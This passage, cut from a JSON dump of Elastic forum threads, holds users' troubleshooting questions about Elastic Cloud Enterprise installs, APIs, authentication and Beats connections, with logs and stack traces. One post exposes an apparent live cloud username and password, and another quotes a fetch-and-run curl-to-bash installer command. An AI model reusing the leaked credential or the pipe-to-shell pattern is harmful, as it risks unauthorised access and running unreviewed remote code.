    "date": "October 4, 2018, 2:53pm October 4, 2018, 7:24pm October 5, 2018, 9:53am October 19, 2018, 9:53am",
    "body": "Hi, When I create a new cluster using the API, passing the json below, I get 201 status that it's been accepted but in ECE the deployment crashes with the error 'Cannot read property 'plan' of null'. 'kibana': {'cluster_name': 'py_kib', 'plan': {'cluster_topology': [{'instance_configuration_id': 'kibana', 'zone_count': 1}], 'kibana': {'version': '6.4.0'}, 'transient': {}, 'zone_count': 2}}, 'plan': {'cluster_topology': [{'instance_configuration_id': 'data.default', 'node_type': {'data': True, 'ingest': True, 'master': True, 'ml': False}, 'zone_count': 1}, {'instance_configuration_id': 'data.highstorage', 'node_type': {'data': True, 'ingest': True, 'master': True, 'ml': False}, 'zone_count': 1}], 'elasticsearch': {'curation': {'from_instance_configuration_id': 'data.default', 'to_instance_configuration_id': 'data.highstorage'}, 'version': '6.4.0'}, 'tiebreaker_topology': {'memory_per_node': 1024}}, 'settings': {'curation': {'specs': []}}} TypeError: Cannot read property 'plan' of null at t.value (http://10.117.142.216:12400/app.a61f89c1e4fc0148a088.js:1:1397553) at dn (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:35450) at Tn (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:47482) at Yn (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:57315) at Kn (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:57623) at fr (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:61005) at ur (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:60514) at sr (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:60340) at ir (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:59712) at Jn (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:59071) at Object.enqueueSetState (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:67:22728) at l.i.setState (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:59:784) at l.onStateChange (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:41:224820) at Object.notify (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:67:59059) at e.notifyNestedSubs (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:67:59571) at l.onStateChange (http://10.117.142.216:12400/vendor.9b5136f2335ece1032af.js:41:224838) I'm also getting this error... {'errors': [{'code': 'root.invalid_json_request', 'fields': ['plan.elasticsearch'], 'message': 'JSON request does not comply with schema: [Object is ' \"missing required member 'elasticsearch']\"}]} when I omit elasticsearch from the plan, even though it isn't required according to the API reference at https://www.elastic.co/guide/en/cloud-enterprise/current/ElasticsearchClusterPlan.html so not sure if that should be required in the docs or I'm just misunderstanding something somewhere ( more likely ) I'm on 2.0.0 if that makes a difference too. Thanks James",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fd6c2d49-1e0d-4774-a301-6745040c843d",
    "url": "https://discuss.elastic.co/t/authentication-and-accounts-in-ece-2-0/151136",
    "title": "Authentication and Accounts in ECE 2.0",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "October 5, 2018, 1:48am October 5, 2018, 3:51am October 19, 2018, 2:23am",
    "body": "I installed ECE 2.0 on Ubuntu Linux 18 and have some questions regarding authentication and logging in. How do I change the password for the admin and readonly user accounts? What is the user account to use for logging into Kibana? There is a Kibana end point to the ES logging cluster but I am not able to log into Kibana using the admin account. The same goes for the Elasticsearch endpoint. Which account should I use to access the Elasticsearch cluster?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "61ee7071-d68a-435d-9138-9de7d5f3f7a2",
    "url": "https://discuss.elastic.co/t/documentation-regarding-the-different-activity-actions-ece-v1-1/150770",
    "title": "Documentation regarding the different activity actions (ECE v1.1)",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Simon_Khan",
    "date": "October 2, 2018, 9:26pm October 2, 2018, 9:57pm October 2, 2018, 11:36pm October 3, 2018, 2:14am October 3, 2018, 7:08pm October 4, 2018, 1:07pm October 4, 2018, 5:12pm October 18, 2018, 5:12pm",
    "body": "When reading through my clusters' activity through the following endpoint https://www.elastic.co/guide/en/cloud-enterprise/1.1/get-es-cluster-plan-activity.html I noticed there are different activity actions found in the https://www.elastic.co/guide/en/cloud-enterprise/1.1/ChangeSourceInfo.html. Specifically, in the source.action. The following is a list of all of the unique actions i've seen across all of my clusters. elasticsearch.update-cluster-plan vacate-allocator elasticsearch.create-cluster elasticsearch.stop-cluster elasticsearch.reboot-cluster elasticsearch.restart-cluster create-logging-and-metrics-cluster create-admin-console-backend Is there any additional documentation describing what each of these activity actions do to a cluster? Specifically, which activity actions stop and restart a cluster. Based on my own analysis, I've seen that the 3 create actions, elasticsearch.restart-cluster and elasticsearch.update-cluster-plan restart a cluster, and elasticsearch.stop-cluster stops a cluster. Is this a safe assumption to make that no other activity actions correspond to a restart/stop?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "05993c68-4d1d-4288-b6e4-7c841eca1c9e",
    "url": "https://discuss.elastic.co/t/creating-a-second-elastic-user/150920",
    "title": "Creating a second Elastic user",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "mc1392",
    "date": "October 3, 2018, 4:38pm October 3, 2018, 6:05pm October 3, 2018, 6:32pm October 3, 2018, 7:10pm October 4, 2018, 1:35pm October 4, 2018, 1:48pm October 4, 2018, 1:51pm October 18, 2018, 1:51pm",
    "body": "Is it possible to create a second user, other than the initial user , named Elastic?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "7ce1db57-8799-4650-ab2c-0bf40f048713",
    "url": "https://discuss.elastic.co/t/install-failing-ece-2-0-0-centos-7-5/150600",
    "title": "Install Failing ECE 2.0.0 CentOS 7.5",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "naknak987",
    "date": "October 1, 2018, 7:09pm October 1, 2018, 7:13pm October 1, 2018, 7:13pm October 1, 2018, 7:14pm October 1, 2018, 7:15pm October 1, 2018, 8:16pm October 2, 2018, 2:57pm October 2, 2018, 3:22pm October 2, 2018, 7:09pm October 2, 2018, 8:27pm October 3, 2018, 5:57am October 3, 2018, 1:24pm October 3, 2018, 1:44pm October 17, 2018, 1:50pm",
    "body": "I have a CentOS 7.5 VM that I'm trying to install ECE 2.0.0 on. I've setup everything according to https://www.elastic.co/guide/en/cloud-enterprise/current/ece-configure-hosts.html#ece-configure-hosts-rhel-centos. I can't find anything on here or google that seems to help. Below is the output of bash <(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) install --debug. See the following post, it was too long to put here. After that, I get the following from running docker ps. CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 23362ca36f11 docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes 0.0.0.0:12400->5601/tcp, 0.0.0.0:12443->5643/tcp frc-cloud-uis-cloud-ui 0a413c449a4e docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes 0.0.0.0:12300->12300/tcp, 0.0.0.0:12343->12343/tcp frc-admin-consoles-admin-console 7efcfd93df5f docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes frc-constructors-constructor de4b8d73d88a docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes frc-curators-curator da684012f685 docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes 0.0.0.0:9244->9244/tcp, 0.0.0.0:12344->12344/tcp frc-services-forwarders-services-forwarder dc730f25a56e docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes 0.0.0.0:2112->2112/tcp frc-directors-director 5fc99876ee5c docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes frc-beats-runners-beats-runner 00f1c387ab3d docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes frc-allocators-allocator 4e72934ddb53 docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes 0.0.0.0:9200->9200/tcp, 0.0.0.0:9243->9243/tcp, 0.0.0.0:9300->9300/tcp, 0.0.0.0:9343->9343/tcp frc-proxies-proxy 3018942d9ad0 docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes frc-blueprints-blueprint 0225dbed61c0 docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes frc-runners-runner 8564896f7720 docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes frc-client-forwarders-client-forwarder 10f97d0dbf31 docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.0.0 \"/sbin/my_init\" 34 minutes ago Up 34 minutes 0.0.0.0:2191->2191/tcp, 0.0.0.0:12191->12191/tcp, 0.0.0.0:12898->12898/tcp, 0.0.0.0:13898->13898/tcp frc-zookeeper-servers-zookeeper",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "b8f07204-48d6-456f-9938-697e3ff31dbd",
    "url": "https://discuss.elastic.co/t/api-key-for-elastic-cloud/150615",
    "title": "API Key for Elastic Cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "mc1392",
    "date": "October 1, 2018, 8:48pm October 1, 2018, 9:04pm October 2, 2018, 4:06pm October 2, 2018, 4:55pm October 2, 2018, 4:56pm October 3, 2018, 10:23am October 17, 2018, 10:23am",
    "body": "Is there a way to create an API key instead of a username:password combination? If not an API key, is there an alternative? I have developers using React javascript and the username and password is clear in transmissions. Any way around this?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "8000fae5-3c01-4110-8409-02f34f0e65c4",
    "url": "https://discuss.elastic.co/t/can-i-monitor-different-client-projects/150691",
    "title": "Can I monitor different client projects",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Raj_Kumar",
    "date": "October 2, 2018, 11:59am October 2, 2018, 12:15pm October 3, 2018, 9:35am October 17, 2018, 9:35am",
    "body": "Hi There, We have multiple clients hosted standalone at different site locations for different projects ,is it possible to monitor all these clusters at one place at elastic cloud services? I mean monitoring using beats. Thanks Raj",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "13e5ab28-ad01-487b-a610-da7c52d923ff",
    "url": "https://discuss.elastic.co/t/ece-installation-failure-1-1-5/147206",
    "title": "ECE installation failure - 1.1.5",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "darren.skinner",
    "date": "September 4, 2018, 12:38pm September 18, 2018, 2:42am September 24, 2018, 2:21pm September 24, 2018, 8:58pm September 25, 2018, 12:20pm September 25, 2018, 12:46pm September 25, 2018, 6:07pm September 25, 2018, 6:54pm September 25, 2018, 7:00pm October 2, 2018, 12:59pm October 16, 2018, 12:59pm",
    "body": "Hi, I've been trying to install ece to test but i'm getting the following output and can't see any obvious problem to try to fix it. This is an offline installation so i have created an internal docker registry with the ECE image and 6.4 images for ES and Kibana. ... -bash-4.2$ bash ./elastic-cloud-enterprise.sh install --docker-registry host2.internal.com:5000 --host-storage-path /local/1/elastic-cloud --debug Creating Admin Console Elasticsearch backend {} Unhandled error. {} -- An error has occurred in bootstrap process. Please examine logs -- java.util.concurrent.TimeoutException: Futures timed out after [30 minutes] at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala:223) at scala.concurrent.impl.Promise$DefaultPromise.result(Promise.scala:227) at scala.concurrent.Await$$anonfun$result$1.apply(package.scala:190) at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala:53) at scala.concurrent.Await$.result(package.scala:190) at no.found.bootstrap.BootstrapInitial.bootstrapServiceLayer(BootstrapInitial.scala:880) at no.found.bootstrap.BootstrapInitial.bootstrap(BootstrapInitial.scala:650) at no.found.bootstrap.BootstrapInitial$.delayedEndpoint$no$found$bootstrap$BootstrapInitial$1(BootstrapInitial.scala:1215) at no.found.bootstrap.BootstrapInitial$delayedInit$body.apply(BootstrapInitial.scala:1209) at scala.Function0$class.apply$mcV$sp(Function0.scala:34) at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12) at scala.App$$anonfun$main$1.apply(App.scala:76) at scala.App$$anonfun$main$1.apply(App.scala:76) at scala.collection.immutable.List.foreach(List.scala:392) at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:35) at scala.App$class.main(App.scala:76) at no.found.bootstrap.BootstrapInitial$.main(BootstrapInitial.scala:1209) at no.found.bootstrap.BootstrapInitial.main(BootstrapInitial.scala)",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "0abac8f9-1e79-4412-9e46-4de65b43090b",
    "url": "https://discuss.elastic.co/t/elastic-cloud-with-filebeat/150308",
    "title": "Elastic Cloud with Filebeat",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ratman",
    "date": "September 28, 2018, 8:00am September 28, 2018, 8:59am September 29, 2018, 8:40pm September 29, 2018, 9:32pm October 13, 2018, 9:37pm",
    "body": "Hello! We are developing a small project for which we have decided to use the Elastic Cloud service as a deployment for our product but we have a major doubt about data ingest. Currently we receive some data logs to our ftp server, and we use filebeat to access to our local folder and then Logstash to treat them. I am aware that Logstash should be set up in our server, but could we configure Filebeat from Elastic Cloud so it access directly to the original FTP server? Thanks in advance!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "75dc5fcd-cc21-403a-aac3-3cd7b2f55763",
    "url": "https://discuss.elastic.co/t/how-to-monitor-the-memory-cost-of-a-query/149911",
    "title": "How to monitor the memory cost of a query?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "ankurlathwal",
    "date": "September 25, 2018, 10:57pm September 26, 2018, 1:36pm September 26, 2018, 4:06pm September 26, 2018, 4:18pm September 26, 2018, 4:18pm September 26, 2018, 4:21pm September 26, 2018, 6:27pm October 10, 2018, 6:26pm",
    "body": "Our ECE cluster JVM memory gets stacked up almost every day now. Sometimes, I see that the number of requests at a particular time rockets up to 15k (with around 14.5k being indexing requests). But the cluster has also auto-restarted when the total requests were close to 500 (250 search and 250 indexing). I suspect that there is some certain kind of request that is consuming multiple amounts of memory compared to the other requests. To help me narrow down the culprit, can someone suggest a way how I can how much affect one kind of request have one the memory? Or basically, how can I calculate the cost/request? Suggestions are welcome.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "df683463-79d9-44f1-b0de-ef43ef7da5e4",
    "url": "https://discuss.elastic.co/t/kibana-not-loading-in-ece/148023",
    "title": "Kibana not loading in ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "gautu7",
    "date": "September 11, 2018, 2:48am September 24, 2018, 8:49pm September 24, 2018, 9:13pm October 22, 2018, 9:13pm",
    "body": "Hi, I have a 6.4.x elasticsearch cluster which I want to monitor and it's configured to send metrics to another 6.4.x cluster. Looks like the metrics are being sent successfully and the shards are Green on looking at the monitoring cluster’s overview page. When I tried to load the Kibana page with the URL on the monitoring cluster, the page does not load and I see this error - server IP address could not be found. I was debugging to see what happened by looking at the Proxy logs in the cluster and saw a 404 Not Found - 0:0:0:0:0:0:0:1 - 0:0:0:0:0:0:0:1 - GET //<guid>.containerhost:9244/.kibana/_mapping HTTP/1.1 in:0 out:351 (2 ms). Is this something with the built-in user configuration settings or some other setting I am missing here?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d87cd958-19a9-425e-95f3-77b84aaa15d8",
    "url": "https://discuss.elastic.co/t/error-when-creating-clusters-across-availability-zones/147052",
    "title": "Error when creating Clusters across Availability Zones",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "September 3, 2018, 10:37am September 17, 2018, 10:38am September 24, 2018, 9:10pm",
    "body": "I have a ECE setup with 3 availability zones within a network. Within each zone, there are 2 VMs. 1 VM has the proxy and allocator roles while the other VM has the coordinator and director roles. Whenever a cluster is created which needs to reside on 2 or 3 availability zones, the cluster creation process will fail. The error message is: Unexpected error during step: [allocate-instances]: [no.found.constructor.steps.allocation.AllocationFailedException: Allocation failed: [CoordinationFailed(org.apache.zookeeper.KeeperMultiException: KeeperErrorCode = NoNode with [CHECK(/, null)), SET_DATA(/clusters/769a5b21eda2420cadf9ee88afc4551a/instances/instance-0000000002, null)), SET_DATA(/clusters/769a5b21eda2420cadf9ee88afc4551a/instances/instance-0000000005, null)), SET_DATA(/clusters/769a5b21eda2420cadf9ee88afc4551a/instances/instance-0000000003, null)), SET_DATA(/clusters/769a5b21eda2420cadf9ee88afc4551a/instances/instance-0000000001, null)), SET_DATA(/clusters/769a5b21eda2420cadf9ee88afc4551a/instances/instance-0000000004, null)), SET_DATA(/clusters/769a5b21eda2420cadf9ee88afc4551a/instances/instance-0000000000, null)), SET_DATA(/services/allocators/ece-region-1b/10.2.92.201/instances, null)), SET_DATA(/services/allocators/ece-region-1c/10.2.92.202/instances, null)), SET_DATA(/services/allocators/ece-region-1a/10.2.92.200/instances, null))])].] If a cluster is created just on 1 availability zone, then the cluster can be created successfully. However, if I edit the cluster to run from 1 to 2 availability zones, then the same error message will appear. How do I address this problem?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "84c89f43-50fe-4cfb-9c0b-d8aae5afd9a4",
    "url": "https://discuss.elastic.co/t/disable-to-connect-to-elastic-cloud-using-httpbeat/148996",
    "title": "Disable to connect to elastic cloud,using httpbeat",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "IBenabd",
    "date": "September 18, 2018, 2:41pm September 24, 2018, 9:01pm October 8, 2018, 9:11pm",
    "body": "I'm struggling to connect my httpbeat to elasticsearch hosted into elastic cloud thus, this is my config: httpbeat.yml #----------------------------- httpbeat output -------------------------------- output.elasticsearch: hosts: [\"980d91d648b24fb6b53668e2eb3e7342.eu-central-1.aws.cloud.es.io:9243\"] index: \"httpbeat-%{+yyyy.MM}\" httpbeat.full.yml processors: #- add_cloud_metadata: -add_cloud_metadata: cloud.auth:\"elastic:qp6BC0K7UrTsH6n\" cloud.id:\"Ikbel_abd:ZXUtY2VudHJhbC0xLmF3cy5jbG91ZC5lcy5pbyQ5ODBkOTF\" output.elasticsearch: hosts:[\"https://980d91d648b24fb6b53668e2eb3e7342.eu-central-1.aws.cloud.es.io:9243/\"] I got this error while execution httpbeat 2018/09/18 14:30:46.515900 metrics.go:39: INFO Non-zero metrics in the last 30s: libbeat.publisher.messages_in_worker_queues=2 libbeat.publisher.published_events=2 2018/09/18 14:30:46.651053 output.go:109: DBG output worker: publish 2 events 2018/09/18 14:30:46.651053 client.go:642: DBG ES Ping(url=https://980d91d648b24fb6b53668e2eb3e7342.eu-central-1.aws.cloud.es.io:9243/, timeout=1m30s) 2018/09/18 14:30:47.142627 client.go:647: DBG Ping request failed with: 401 Unauthorized 2018/09/18 14:30:47.142627 single.go:140: ERR Connecting error publishing events (retrying): 401 Unauthorized 2018/09/18 14:30:47.143608 single.go:156: DBG send fail 2018/09/18 14:30:48.143755 client.go:642: DBG ES Ping(url=https://980d91d648b24fb6b53668e2eb3e7342.eu-central-1.aws.cloud.es.io:9243/, timeout=1m30s) 2018/09/18 14:30:48.211812 client.go:647: DBG Ping request failed with: 401 Unauthorized 2018/09/18 14:30:48.211812 single.go:140: ERR Connecting error publishing events (retrying): 401 Unauthorized 2018/09/18 14:30:48.211812 single.go:156: DBG send fail 2018/09/18 14:30:50.212087 client.go:642: DBG ES Ping(url=https://980d91d648b24fb6b53668e2eb3e7342.eu-central-1.aws.cloud.es.io:9243/, timeout=1m30s) 2018/09/18 14:30:50.280145 client.go:647: DBG Ping request failed with: 401 Unauthorized 2018/09/18 14:30:50.280145 single.go:140: ERR Connecting error publishing events (retrying): 401 Unauthorized 2018/09/18 14:30:50.281147 single.go:156: DBG send fail 2018/09/18 14:30:51.264254 service.go:33: DBG Received sigterm/sigint, stopping 2018/09/18 14:30:51.264254 service.go:39: DBG Received svc stop/shutdown request 2018/09/18 14:30:51.264254 metrics.go:51: INFO Total non-zero values: libbeat.es.publish.read_bytes=1782 libbeat.es.publish.write_bytes=519 libbeat.publisher.messages_in_worker_queues=2 libbeat.publisher.published_events=2 2018/09/18 14:30:51.265257 metrics.go:52: INFO Uptime: 34.8002288s 2018/09/18 14:30:51.265257 beat.go:237: INFO httpbeat stopped.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1e4754be-96a0-4b71-9e91-a9e6bb4afe6b",
    "url": "https://discuss.elastic.co/t/ece-accessdeniedexception/149718",
    "title": "ECE AccessDeniedException",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "slm",
    "date": "September 24, 2018, 6:11pm September 24, 2018, 8:51pm October 8, 2018, 8:51pm",
    "body": "Running ECE install produces the following log message in Docker before erroring out. Any help resolving this problem is much appreciated. usermod: no changes *** Running /etc/my_init.d/00_regen_ssh_host_keys.sh... *** Running /etc/rc.local... *** Running setuser founduser /app/elasticsearch.sh... 2018-09-24T12:46:02+0000 Booting at Mon Sep 24 12:46:02 UTC 2018 2018-09-24T12:46:02+0000 Enabling QuotaAwareFileSystemProvider 2018-09-24T12:46:02+0000 First time booting with this image, verifying ephemeral directories are empty 2018-09-24T12:46:02+0000 Adding selected plugin: found-elasticsearch 2018-09-24T12:46:03+0000 Exception in thread \"main\" java.nio.file.AccessDeniedException: /elasticsearch/plugins/.installing-7426190940094277336 2018-09-24T12:46:03+0000 at sun.nio.fs.UnixException.translateToIOException(UnixException.java:84) 2018-09-24T12:46:03+0000 at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102) 2018-09-24T12:46:03+0000 at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107) 2018-09-24T12:46:03+0000 at sun.nio.fs.UnixFileSystemProvider.createDirectory(UnixFileSystemProvider.java:384) 2018-09-24T12:46:03+0000 at co.elastic.cloud.quotaawarefs.QuotaAwareFileSystemProvider.createDirectory(QuotaAwareFileSystemProvider.java:286) 2018-09-24T12:46:03+0000 at java.nio.file.Files.createDirectory(Files.java:674) 2018-09-24T12:46:03+0000 at java.nio.file.TempFileHelper.create(TempFileHelper.java:136) 2018-09-24T12:46:03+0000 at java.nio.file.TempFileHelper.createTempDirectory(TempFileHelper.java:173) 2018-09-24T12:46:03+0000 at java.nio.file.Files.createTempDirectory(Files.java:950) 2018-09-24T12:46:03+0000 at org.elasticsearch.plugins.InstallPluginCommand.stagingDirectory(InstallPluginCommand.java:475) 2018-09-24T12:46:03+0000 at org.elasticsearch.plugins.InstallPluginCommand.unzip(InstallPluginCommand.java:423) 2018-09-24T12:46:03+0000 at org.elasticsearch.plugins.InstallPluginCommand.execute(InstallPluginCommand.java:217) 2018-09-24T12:46:03+0000 at org.elasticsearch.plugins.InstallPluginCommand.execute(InstallPluginCommand.java:202) 2018-09-24T12:46:03+0000 at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:70) 2018-09-24T12:46:03+0000 at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134) 2018-09-24T12:46:03+0000 at org.elasticsearch.cli.MultiCommand.execute(MultiCommand.java:69) 2018-09-24T12:46:03+0000 at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134) 2018-09-24T12:46:03+0000 at org.elasticsearch.cli.Command.main(Command.java:90) 2018-09-24T12:46:03+0000 at org.elasticsearch.plugins.PluginCli.main(PluginCli.java:47) *** setuser exited with status 1. *** Killing all processes...",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b98e5bd1-1442-4d06-95a4-bd0a9e97a806",
    "url": "https://discuss.elastic.co/t/search-slow-log-with-elastic-cloud/147709",
    "title": "Search Slow Log with Elastic Cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Pavlo",
    "date": "September 7, 2018, 12:21pm September 11, 2018, 11:13am September 11, 2018, 11:17am September 25, 2018, 11:17am",
    "body": "Hello. Is it possible to use Search Slow Log with Elastic Cloud? I see here that it has configuration in config files and log file is located in file system.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "57b07fa7-826a-45a5-a94d-5dd685d1d654",
    "url": "https://discuss.elastic.co/t/es-and-kibana-endpoints-not-accessible/147058",
    "title": "ES and Kibana Endpoints Not Accessible",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "September 3, 2018, 11:20am September 3, 2018, 2:39pm September 6, 2018, 7:25am September 20, 2018, 6:55am",
    "body": "I have a cluster on ECE which runs on 1 availability zone. The end points for Elasticsearch and Kibana of the cluster are: https://918a2067fdcb4aafaea2a889abf3f87b.10.2.92.184.ip.es.io:9243 https://20b41f36ef3949aaa754224477ccdb92.10.2.92.184.ip.es.io:9243 When I tried to access them from a remote client within the network, these end points were not accessible. The ECE documentation addresses this issue for AWS by switching the address to the server's IP. I'm not sure if this can be applied to the above case?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b3121e8c-f7c5-45f1-9c3d-1c529391d907",
    "url": "https://discuss.elastic.co/t/query-on-cluster-creation-endpoint-and-proxies/146469",
    "title": "Query on Cluster Creation, Endpoint and Proxies",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "August 29, 2018, 6:03am August 29, 2018, 1:41pm September 12, 2018, 1:41pm",
    "body": "I have just finished setting up ECE and have a few questions on creating clusters and how to send search queries or send index writes to the clusters. On the Create Cluster page, there is a drop down list of RAM and Storage for the nodes. Is it a must to have the amount of disk space available for the selected RAM size? For each cluster, there is an Elasticsearch endpoint. Is the purpose to allow a remote Kibana to connect to that particular cluster? I read from the ECE documentation that applications should connect to a cluster via the proxy. Are there examples on how to do so?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d087597b-586d-4b55-9716-a3172761cb84",
    "url": "https://discuss.elastic.co/t/ece-showing-nan-available-capacity/145087",
    "title": "ECE showing NaN Available Capacity",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "August 20, 2018, 5:35am August 20, 2018, 5:59am August 20, 2018, 10:44am August 29, 2018, 3:07am September 12, 2018, 3:08am",
    "body": "I installed ECE on 3 VMs using a small baseline setup in a non production environment. Each server is assigned a different availability zone and each server has the runner, proxy, allocator, coordinator and director roles. On the Summary page, the available capacity reading is always NaN MB. Installation was smooth and there were no errors or warnings returned by ECE in the console page. Does this mean that the hardware resources are not enough and I need to scale out the roles among more VMs?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "27298a14-7d09-4377-b7fc-57a768d0e751",
    "url": "https://discuss.elastic.co/t/metricbeat-6-3-0-tries-to-connect-on-443-instead-of-9243/145919",
    "title": "Metricbeat 6.3.0 tries to connect on 443 instead of 9243",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jmcherian",
    "date": "August 24, 2018, 1:09pm August 27, 2018, 8:54am August 27, 2018, 10:23am September 10, 2018, 10:36am",
    "body": "Hi I am trying to evaluate ECE and configured a cluster and am trying to set up a issue with metric beat to send performance information to ECE cloud. I keep getting error showing that the connection is refused. Firewall is disabled on the ECE. ./metricbeat --setup -e -E 'cloud.id=ecenonprd:MTAuMjUwLjIxLj' -c /etc/metricbeat/metricbeat.yml 2018-08-24T13:44:36.964+0200 INFO instance/beat.go:492 Home path: [/usr/share/metricbeat/bin] Config path: [/usr/share/metricbeat/bin] Data path: [/usr/share/metricbeat/bin/data] Logs path: [/usr/share/metricbeat/bin/logs] 2018-08-24T13:44:41.805+0200 INFO [monitoring] log/log.go:133 Uptime: 4.887001536s 2018-08-24T13:44:41.805+0200 INFO [monitoring] log/log.go:110 Stopping metrics logging. 2018-08-24T13:44:41.805+0200 INFO instance/beat.go:306 metricbeat stopped. 2018-08-24T13:44:41.805+0200 ERROR instance/beat.go:691 Exiting: Error importing Kibana dashboards: fail to create the Elasticsearch loader: Error creating Elasticsearch client: Couldn't connect to any of the configured Elasticsearch hosts. Errors: [Error connection to Elasticsearch https://containerinfo.myip.ip.es.io:443: Get https://containerinfo.myip.ip.es.io:443: dial tcp 10.250.21.12:443: getsockopt: connection refused] Exiting: Error importing Kibana dashboards: fail to create the Elasticsearch loader: Error creating Elasticsearch client: Couldn't connect to any of the configured Elasticsearch hosts. Errors: [Error connection to Elasticsearch https://containerinfo.myip.ip.es.io:443: Get https://containerinfo.myip.ip.es.io:443: dial tcp myip:443: getsockopt: connection refused] As I understand it should be trying to connect on 9243 which is the port on which elasticsearch and kibana is listening Any ideas ? Thanks Cheriyan",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7ab6ee45-dec4-4d68-a07a-ee40ce7147ae",
    "url": "https://discuss.elastic.co/t/how-to-register-remote-clusters-in-ece/144896",
    "title": "How to register remote clusters in ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "jthacker",
    "date": "August 24, 2018, 10:40am August 27, 2018, 7:58am September 24, 2018, 7:58am",
